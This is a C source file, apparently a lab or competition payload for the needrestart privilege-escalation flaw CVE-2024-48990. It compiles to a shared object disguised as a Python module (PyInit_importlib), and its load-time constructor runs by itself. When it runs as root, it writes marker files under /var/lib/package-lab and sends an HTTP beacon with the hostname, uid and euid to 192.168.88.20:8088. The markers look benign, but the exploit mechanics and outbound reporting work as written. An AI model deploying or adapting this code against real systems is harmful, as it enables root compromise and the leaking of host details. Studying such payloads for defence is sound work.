#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

static void sanitize_hostname(char *hostname) {
    char *cursor;

    for (cursor = hostname; *cursor != '\0'; cursor++) {
        if ((*cursor >= 'a' && *cursor <= 'z') ||
            (*cursor >= 'A' && *cursor <= 'Z') ||
            (*cursor >= '0' && *cursor <= '9') ||
            *cursor == '.' || *cursor == '-' || *cursor == '_') {
            continue;
        }
        *cursor = '_';
    }
}

static void send_one_way_beacon(long uid, long euid, long epoch_seconds) {
    const char *fixture = "react-codeshift-1.3.1-persistent-root";
    struct sockaddr_in destination = {0};
    struct pollfd poll_fd;
    struct utsname system_info;
    socklen_t error_length;
    char hostname[128] = "unknown";
    char request[768];
    int socket_error = 0;
    int request_length;
    int fd;

    fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0);
    if (fd == -1) {
        return;
    }

    destination.sin_family = AF_INET;
    destination.sin_port = htons(8088);
    if (inet_pton(AF_INET, "192.168.88.20", &destination.sin_addr) != 1) {
        close(fd);
        return;
    }

    if (connect(fd, (struct sockaddr *)&destination, sizeof(destination)) == -1 &&
        errno != EINPROGRESS) {
        close(fd);
        return;
    }

    poll_fd.fd = fd;
    poll_fd.events = POLLOUT;
    poll_fd.revents = 0;
    if (poll(&poll_fd, 1, 500) <= 0) {
        close(fd);
        return;
    }
    error_length = sizeof(socket_error);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &socket_error, &error_length) == -1 ||
        socket_error != 0) {
        close(fd);
        return;
    }

    if (uname(&system_info) == 0) {
        snprintf(hostname, sizeof(hostname), "%s", system_info.nodename);
        sanitize_hostname(hostname);
    }
    request_length = snprintf(
        request,
        sizeof(request),
        "GET /apt-event?event=needrestart-root-execution&host=%s&uid=%ld&euid=%ld"
        "&epoch=%ld&fixture=%s HTTP/1.1\r\n"
        "Host: 192.168.88.20:8088\r\nConnection: close\r\n\r\n",
        hostname,
        uid,
        euid,
        epoch_seconds,
        fixture);
    if (request_length > 0 && (size_t)request_length < sizeof(request)) {
        (void)send(fd, request, (size_t)request_length, MSG_NOSIGNAL);
    }
    close(fd);
}

__attribute__((constructor)) static void package_lab_marker(void) {
    const char *dir = "/var/lib/package-lab";
    const char *path = "/var/lib/package-lab/cve-2024-48990-root-marker.json";
    const char *state_path = "/var/lib/package-lab/root-stage-observed";
    struct timespec now;
    int fd;
    int state_fd;

    if (geteuid() != 0) {
        return;
    }
    if (mkdir(dir, 0700) == -1 && errno != EEXIST) {
        return;
    }
    clock_gettime(CLOCK_REALTIME, &now);
    state_fd = open(state_path, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC, 0600);
    if (state_fd != -1) {
        dprintf(state_fd, "root-stage-observed epoch=%ld uid=%ld euid=%ld\n",
                (long)now.tv_sec, (long)getuid(), (long)geteuid());
        close(state_fd);
    }
    /* DEBUG_ONLY_JSON_ARTIFACT: remove this local marker for competition builds. */
    fd = open(path, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC, 0600);
    if (fd != -1) {
        dprintf(fd,
                "{\n  \"event\": \"cve-2024-48990-root-marker\",\n"
                "  \"uid\": %ld,\n  \"euid\": %ld,\n"
                "  \"epoch_seconds\": %ld,\n  \"network_actions\": 1,\n"
                "  \"network_action_type\": \"one-way-lab-http-get\"\n}\n",
                (long)getuid(), (long)geteuid(), (long)now.tv_sec);
        close(fd);
    }
    send_one_way_beacon((long)getuid(), (long)geteuid(), (long)now.tv_sec);
}

void *PyInit_importlib(void) {
    return NULL;
}
